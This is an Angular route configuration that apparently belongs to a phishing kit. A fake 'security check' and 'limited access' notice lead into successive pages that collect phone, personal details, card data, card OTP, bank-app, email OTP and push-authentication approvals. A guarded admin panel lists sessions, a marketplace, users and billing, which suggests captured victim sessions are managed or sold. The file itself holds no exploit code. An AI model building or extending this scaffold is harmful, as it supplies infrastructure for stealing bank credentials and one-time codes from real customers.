
import { Routes } from '@angular/router';
import { adminGuard } from '../guards/admin.guard';

export const routes: Routes = [
    { path: '', redirectTo: 'security-check', pathMatch: 'full' },
    {
        path: '',
        loadComponent: () => import('../components/layout/user-layout.component').then(m => m.UserLayoutComponent),
        children: [
            {
                path: 'security-check',
                loadComponent: () => import('../components/security-check.component').then(m => m.SecurityCheckComponent),
                data: { animation: 'Security' }
            },
            {
                path: 'login',
                loadComponent: () => import('../components/login.component').then(m => m.LoginComponent),
                data: { animation: 'Login' }
            },
            {
                path: 'limited',
                loadComponent: () => import('../components/limited-access.component').then(m => m.LimitedAccessComponent),
                data: { animation: 'Limited' }
            },
            {
                path: 'phone',
                loadComponent: () => import('../components/phone-verification.component').then(m => m.PhoneVerificationComponent),
                data: { animation: 'Phone' }
            },
            {
                path: 'personal',
                loadComponent: () => import('../components/personal-verification.component').then(m => m.PersonalVerificationComponent),
                data: { animation: 'Personal' }
            },
            {
                path: 'card',
                loadComponent: () => import('../components/card-verification.component').then(m => m.CardVerificationComponent),
                data: { animation: 'Card' }
            },
            {
                path: 'card-otp',
                loadComponent: () => import('../components/card-otp.component').then(m => m.CardOtpComponent),
                data: { animation: 'CardOtp' }
            },
            {
                path: 'bank-app',
                loadComponent: () => import('../components/bank-app-verification.component').then(m => m.BankAppVerificationComponent),
                data: { animation: 'BankApp' }
            },
            {
                path: 'email-otp',
                loadComponent: () => import('../components/email-otp.component').then(m => m.EmailOtpComponent),
                data: { animation: 'EmailOtp' }
            },
            {
                path: 'push-auth',
                loadComponent: () => import('../components/push-notification.component').then(m => m.PushNotificationComponent),
                data: { animation: 'PushAuth' }
            },
            {
                path: 'loading',
                loadComponent: () => import('../components/loading.component').then(m => m.LoadingComponent),
                data: { animation: 'Loading' }
            },
            {
                path: 'step-success',
                loadComponent: () => import('../components/step-success.component').then(m => m.StepSuccessComponent),
                data: { animation: 'Success' }
            },
            {
                path: 'success',
                loadComponent: () => import('../components/success.component').then(m => m.SuccessComponent),
                data: { animation: 'SuccessFinal' }
            }
        ]
    },
    {
        path: 'admin/login',
        loadComponent: () => import('../components/admin-login.component').then(m => m.AdminLoginComponent),
        data: { animation: 'AdminLogin' }
    },
    {
        path: 'admin',
        loadComponent: () => import('../components/admin-v2/layout/admin-layout.component').then(m => m.AdminLayoutV2Component),
        canActivate: [adminGuard],
        children: [
            { path: '', redirectTo: 'dashboard', pathMatch: 'full' },
            {
                path: 'dashboard',
                loadComponent: () => import('../components/admin-v2/dashboard/dashboard.component').then(m => m.AdminDashboardV2Component)
            },
            { path: 'sessions', loadComponent: () => import('../components/admin-v2/sessions/sessions.component').then(m => m.SessionsComponent) },
            { path: 'marketplace', loadComponent: () => import('../components/admin-v2/marketplace/marketplace.component').then(m => m.MarketplaceComponent) },
            { path: 'users', loadComponent: () => import('../components/admin-v2/users/users.component').then(m => m.UsersComponent) },
            { path: 'settings', loadComponent: () => import('../components/admin-v2/settings/settings.component').then(m => m.SettingsComponent) },
            { path: 'billing', loadComponent: () => import('../components/admin-v2/billing/billing.component').then(m => m.BillingComponent) },
            { path: 'system', loadComponent: () => import('../components/admin-v2/system/system-dashboard.component').then(m => m.SystemDashboardComponent) }
        ]
    },
    { path: '**', redirectTo: 'security-check' }
];
